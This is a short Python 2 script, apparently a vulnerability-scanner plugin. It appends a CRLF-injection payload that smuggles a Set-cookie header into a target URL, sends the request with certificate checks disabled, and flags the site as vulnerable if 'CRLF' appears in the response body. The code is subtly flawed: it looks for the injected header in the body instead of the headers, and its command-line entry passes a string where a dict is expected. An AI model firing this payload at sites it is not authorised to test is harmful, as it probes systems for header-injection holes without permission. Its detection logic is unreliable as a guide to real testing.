#-*-coding:utf-8-*-
import sys
import requests
import txconfig

def main(param):
    headers = txconfig.Request_Param.HEADERS
    result = {
        "success": False,
        "result": {}
    }
    try:
        url = param['url']
    except Exception as e:
        result['result'] = e
        return result
    payload = "%0a%0d%0a%0dSet-cookie:CRLF"
    url = url + payload
    Re = requests.get(url,headers=headers,verify=False,allow_redirects=False)
    if "CRLF" in Re.text:
        result['success'] = True
        return result
    else:
        return result

if __name__ == '__main__':
    param = sys.argv[1]
    print main(param)
